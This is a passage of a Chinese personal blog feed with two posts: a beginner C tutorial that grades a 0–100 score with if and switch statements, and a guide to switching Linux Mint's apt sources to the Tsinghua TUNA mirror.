<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stido.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">float</span> <span class="n">score</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Please type a score:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%f&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">score</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>其次我得确认这个数字小于 <code>100</code> 并大于 <code>0</code></p>
<blockquote>
<p>满分100分</p>
<p>最低0分</p>
</blockquote>
<p><a href="https://weepingdogel.github.io/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/#%e5%ae%9e%e9%aa%8c%e5%8d%81%e4%b8%80" target="_blank" rel="noopener noreffer">之前写过的一篇文章里</a>就提到了 <code>&amp;&amp;</code> 这个符号</p>
<p>因此直接 <code>if(score &lt;= 100 &amp;&amp; &gt;= 0){}</code> 即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">float</span> <span class="n">score</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Please type a score:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%f&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">score</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">score</span> <span class="o">&lt;=</span> <span class="mi">100</span> <span class="o">&amp;&amp;</span> <span class="n">score</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>嗯.. 现在分数来源问题就解决了，如果输入的分数大于100或者小于0, 直接报错</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;The score %.2f is an Error Value!&#34;</span><span class="p">,</span> <span class="n">score</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">float</span> <span class="n">score</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Please type a score:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%f&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">score</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">score</span> <span class="o">&lt;=</span> <span class="mi">100</span> <span class="o">&amp;&amp;</span> <span class="n">score</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;The score %.2f is an Error Value!&#34;</span><span class="p">,</span> <span class="n">score</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>好接下来要做的是把不同的分数评为不同的等级，先说说不同分数对应的字母吧:</p>
<ul>
<li>90到100分为 A</li>
<li>90分以下80分以上为 B</li>
<li>80分以下70分以上为 C</li>
<li>70分以下60分以上为 D</li>
<li>60分以下为 E</li>
</ul>
<p>这些字母将会用一个单字符型变量来存储，我把它命名为 <code>grade</code> 并加入代码中。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">grade</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">float</span> <span class="n">score</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">grade</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Please type a score:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%f&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">score</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">score</span> <span class="o">&lt;=</span> <span class="mi">100</span> <span class="o">&amp;&amp;</span> <span class="n">score</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;The score %.2f is an Error Value!&#34;</span><span class="p">,</span> <span class="n">score</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>那怎样判断分数对应的级别？</p>
<p>其实我们可以用 <code>if(){}</code> 来写的，但是要求使用 <a href="https://www.runoob.com/cprogramming/c-switch.html" target="_blank" rel="noopener noreffer"><code>switch();</code></a></p>
<p><code>switch()</code> 语句是流程控制中的判断语句之一，具体解释如下:</p>
<blockquote>
<p>一个 switch 语句允许测试一个变量等于多个值时的情况。每个值称为一个 case，且被测试的变量会对每个 switch case 进行检查。</p>
<p>switch 语句必须遵循下面的规则：</p>
<ul>
<li>switch 语句中的 expression 是一个常量表达式，必须是一个整型或枚举类型。</li>
<li>在一个 switch 中可以有任意数量的 case 语句。每个 case 后跟一个要比较的值和一个冒号。</li>
<li>case 的 constant-expression 必须与 switch 中的变量具有相同的数据类型，且必须是一个常量或字面量。</li>
<li>当被测试的变量等于 case 中的常量时，case 后跟的语句将被执行，直到遇到 break 语句为止。</li>
<li>当遇到 break 语句时，switch 终止，控制流将跳转到 switch 语句后的下一行。</li>
<li>不是每一个 case 都需要包含 break。如果 case 语句不包含 break，控制流将会 继续 后续的 case，直到遇到 break 为止。</li>
<li>一个 switch 语句可以有一个可选的 default case，出现在 switch 的结尾。default case 可用于在上面所有 case 都不为真时执行一个任务。default case 中的 break 语句不是必需的。</li>
</ul>
<p>——<a href="https://www.runoob.com/cprogramming/c-switch.html" target="_blank" rel="noopener noreffer">C switch 语句 | 菜鸟教程</a></p>
</blockquote>
<p>总感觉这个解释已经很容易看懂了&hellip;所以我不想用自己的话说一遍.. 这样会写得很长并且看起来很水..</p>
<p>我们大概就是要把取来的分数除以10然后转化成整数，再把这个整数进行逐一比对。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">switch</span> <span class="p">((</span><span class="kt">int</span><span class="p">)(</span><span class="n">score</span> <span class="o">/</span> <span class="mi">10</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">10</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">9</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">grade</span> <span class="o">=</span> <span class="sc">&#39;A&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">8</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">grade</span> <span class="o">=</span> <span class="sc">&#39;B&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">7</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">grade</span> <span class="o">=</span> <span class="sc">&#39;C&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">6</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">grade</span> <span class="o">=</span> <span class="sc">&#39;D&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">grade</span> <span class="o">=</span> <span class="sc">&#39;E&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来直接输出分数和字母就好了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;The score %.2f is grade %c .</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">score</span><span class="p">,</span><span class="n">grade</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这些都写进上面那个 <code>if(){}</code> 语句里面</p>
<p>看下面的完整代码吧～</p>
<h1 id="完整代码">完整代码</h1>
<p>到 Github 看: <a href="https://github.com/WeepingDogel/drafts/blob/main/C/a.c" target="_blank" rel="noopener noreffer">drafts/a.c at main · WeepingDogel/drafts · GitHub</a></p>
<p>这里看:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">分数判断成绩 ABCDEF
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">By WeepingDogel
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">float</span> <span class="n">score</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">grade</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;please input your score:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%f&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">score</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">score</span> <span class="o">&lt;=</span> <span class="mi">100</span> <span class="o">&amp;&amp;</span> <span class="n">score</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="p">((</span><span class="kt">int</span><span class="p">)(</span><span class="n">score</span> <span class="o">/</span> <span class="mi">10</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">10</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">9</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">grade</span> <span class="o">=</span> <span class="sc">&#39;A&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">8</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">grade</span> <span class="o">=</span> <span class="sc">&#39;B&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">7</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">grade</span> <span class="o">=</span> <span class="sc">&#39;C&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">6</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">grade</span> <span class="o">=</span> <span class="sc">&#39;D&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">grade</span> <span class="o">=</span> <span class="sc">&#39;E&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;The score %.2f is grade %c .</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">score</span><span class="p">,</span><span class="n">grade</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;The score %.2f is an Error Value!&#34;</span><span class="p">,</span> <span class="n">score</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="一些要注意的细节">一些要注意的细节</h1>
<p>作为初学者的我认为这些细节必须要知道，如果你也是初学者也会问这些。</p>
<ol>
<li><code>%.2f</code> 是什么意思？</li>
</ol>
<p>意思是取到两位浮点数，也就是取两位小数啦</p>
<p>这里贴出完整的解释</p>
<blockquote>
<p>C 库函数 int printf(const char *format, &hellip;) 发送格式化输出到标准输出 stdout。</p>
<p>printf()函数的调用格式为:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&lt;格式化字符串&gt;&#34;</span><span class="p">,</span> <span class="o">&lt;</span><span class="err">参量表</span><span class="o">&gt;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>下面是 printf() 函数的声明。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">printf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>format &ndash; 这是字符串，包含了要被写入到标准输出 stdout 的文本。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。format 标签属性是 %[flags][width][.precision][length]specifier，具体讲解如下：


</p>
<p>附加参数 &ndash; 根据不同的 format 字符串，函数可能需要一系列的附加参数，每个参数包含了一个要被插入的值，替换了 format 参数中指定的每个 % 标签。参数的个数应与 % 标签的个数相同。</p>
<p>——<a href="https://www.runoob.com/cprogramming/c-function-printf.html" target="_blank" rel="noopener noreffer">C 库函数 – printf() | 菜鸟教程</a></p>
</blockquote>
<ol start="2">
<li>为什么 scanf() 里面那个<code>score</code>前面要加<code>&amp;</code>?</li>
</ol>
<p>这个&hellip; 读到的是内存地址，所以..~</p>
<blockquote>
<p>C 库函数 int scanf(const char *format, &hellip;) 从标准输入 stdin 读取格式化输入。</p>
<p>&hellip;</p>
<ol>
<li>&amp;a、&amp;b、&amp;c 中的 &amp; 是地址运算符，分别获得这三个变量的内存地址。</li>
<li>%d%d%d 是按十进值格式输入三个数值。输入时，在两个数据之间可以用一个或多个空格、tab 键、回车键分隔。</li>
</ol>
<p>——<a href="https://www.runoob.com/cprogramming/c-function-scanf.html" target="_blank" rel="noopener noreffer">C 库函数 – scanf() | 菜鸟教程</a></p>
</blockquote>
<ol start="3">
<li>为什么 <code>case 10：</code> 和 <code>case 9:</code> 之间是空着的？</li>
</ol>
<p>这个啊，因为上面说了需求是 100 和 90 多分都是 A, 要实现这个需求就得利用 <code>switch（）{}</code> 的这个规则:</p>
<blockquote>
<ul>
<li>当遇到 break 语句时，switch 终止，控制流将跳转到 switch 语句后的下一行。</li>
<li>不是每一个 case 都需要包含 break。如果 case 语句不包含 break，控制流将会 继续 后续的 case，直到遇到 break 为止。</li>
</ul>
<p>——<a href="https://www.runoob.com/cprogramming/c-switch.html" target="_blank" rel="noopener noreffer">C switch 语句 | 菜鸟教程</a></p>
</blockquote>
<h1 id="参考链接">参考链接</h1>
<ul>
<li><a href="https://www.runoob.com/cprogramming/c-switch.html" target="_blank" rel="noopener noreffer">C switch 语句 | 菜鸟教程</a></li>
<li><a href="https://www.runoob.com/cprogramming/c-function-printf.html" target="_blank" rel="noopener noreffer">C 库函数 – printf() | 菜鸟教程</a></li>
<li><a href="https://www.runoob.com/cprogramming/c-function-scanf.html" target="_blank" rel="noopener noreffer">C 库函数 – scanf() | 菜鸟教程</a></li>
</ul>
]]></description>
</item><item>
    <title>Linux Mint 如何修改软件源</title>
    <link>http://weepingdogel.github.io/posts/2020-nov-6/</link>
    <pubDate>Fri, 06 Nov 2020 22:54:23 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/2020-nov-6/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/2020-11-07_14-33.png" referrerpolicy="no-referrer">
            </div><h2 id="序">序</h2>
<p>由于 Linux Mint 在安装完之后..</p>
<p><del>唔啊！ 不许笑！！ 我我我当然早就会！写给萌新看的！喂！不许笑！！</del></p>
<p></p>
<p>默认的软件源是官方的，在安装软件包和更新的时候得 <del>跨过山河大海，也要穿过人山人海</del> ，因此我们得把它修改为离我们最近的镜像源</p>
<p>对于 Mint 来说，无非就两种办法</p>
<p><strong>注意：二选一</strong></p>
<h2 id="一终端法">一、终端法</h2>
<p>我们先去 TUNA 镜像站看看<a href="https://mirrors.tuna.tsinghua.edu.cn/help/linuxmint/" target="_blank" rel="noopener noreffer">帮助文档</a></p>
<p>内容是这样的</p>
<p></p>
<p>嗯&hellip; 也许你看不太懂，具体怎么操作&hellip;</p>
<p>首先把鼠标移到左下角，打开终端</p>
<p></p>
<p>就是封面上那个东西..</p>
<p></p>
<p>我们先要编辑 <code>/etc/apt/sources.list</code> 这个文件。</p>
<p>Mint 似乎不自带 <code>vim</code>，所以我们这里使用 <code>nano</code>。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nano /etc/apt/sources.list
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>注意：<code>sudo</code> 不能丢！ 而且按下回车之后要输入密码才能有权限。</strong></p>
<p></p>
<p>我们打开才发现里面是空的，除了一大堆英文注释什么都没有..</p>
<p>我们往里面写入</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">deb http://mirrors.tuna.tsinghua.edu.cn/linuxmint/ ulyana main upstream import backport
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来还不够，因为 Mint 还有一些包要使用 Ubuntu 的仓库，所以我们再看看 <a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener noreffer">Ubuntu 的帮助文档</a></p>
<p></p>
<p>我知道怎么做了，把这些当中的<code>archive.ubuntu.com</code> 等域名全部改成<code>mirrors.tuna.tsinghua.edu.cn</code> 即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">#deb cdrom:[Linux Mint 20 _Ulyana_ - Release amd64 20200624]/ focal contrib main
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># This system was installed using small removable media
</span></span><span class="line"><span class="cl"># (e.g. netinst, live or single CD). The matching &#34;deb cdrom&#34;
</span></span><span class="line"><span class="cl"># entries were disabled at the end of the installation process.
</span></span><span class="line"><span class="cl"># For information about how to configure apt package sources,
</span></span><span class="line"><span class="cl"># see the sources.list(5) manual.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">deb http://mirrors.tuna.tsinghua.edu.cn/linuxmint/ ulyana main upstream import backport
</span></span><span class="line"><span class="cl">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal main restricted universe multiverse
</span></span><span class="line"><span class="cl">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-updates main restricted universe multiverse
</span></span><span class="line"><span class="cl">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-backports main restricted universe multiverse
</span></span><span class="line"><span class="cl">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse
</span></span></code></pre></td></tr></table>
</div>
</div><p>如图：</p>
<p></p>
<p>接下来，执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo apt update
</span></span></code></pre></td></tr></table>
</div>
</div><p>就会比最开始快很多了</p>
<h2 id="二使用自带的更新管理器">二、使用自带的更新管理器</h2>
<p>首先点击开始菜单，找到设置管理器</p>
<p></p>
<p>滚轮滑下去，找到<code>软件源</code></p>
<p></p>
<p>输入你的用户密码</p>
<p></p>
<p>嗯哼，是不是在开头看到过？
</p>
<p>然后用这个软件把这些都改成国内的就好了，具体怎么操作&hellip; 我也不好讲啊&hellip;</p>
<p></p>
<p>唔啊！总之这个就是&hellip; 拿鼠标点点点就好了&hellip;</p>
<p>总之这样就好啦～</p>
<p></p>
<p>接下來它会提示你是否更新 apt 缓存，点击确定就可以啦～</p>
<p></p>
<p>等它跑完就好啦～</p>
<p></p>
<h2 id="更新软件包">更新软件包</h2>
